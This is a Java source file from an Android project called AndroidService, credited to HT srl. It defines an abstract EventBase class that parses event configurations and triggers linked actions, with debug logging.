/* **********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 30-mar-2011
 **********************************************/

package com.android.service.event;

import com.android.service.Status;
import com.android.service.ThreadBase;
import com.android.service.action.Action;
import com.android.service.auto.Cfg;
import com.android.service.util.Check;

// TODO: Auto-generated Javadoc
/**
 * The Class EventBase.
 */
public abstract class EventBase extends ThreadBase {

	/** The Constant TAG. */
	private static final String TAG = "EventBase";

	// Gli eredi devono implementare i seguenti metodi astratti

	/**
	 * Parses the.
	 * 
	 * @param event
	 *            the event
	 */
	public abstract boolean parse(EventConf event);

	/** The event. */
	protected EventConf event;

	/**
	 * Sets the event.
	 * 
	 * @param event
	 *            the new event
	 */
	public void setEvent(final EventConf event) {
		this.event = event;
	}

	/**
	 * Trigger.
	 */
	protected final void trigger() {
		trigger(event.getAction());
	}

	protected final void trigger(int actionId) {
		if (actionId != Action.ACTION_NULL) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " event: " + this + " triggering: " + actionId);
			}
			Status.self().triggerAction(actionId);
		}
	}
	
	@Override
	public String toString(){
		return "Event " + event.getId() + " type:" + event.getType()  + " tr: "+ event.getAction() + " s: " + getStatus();
	}

}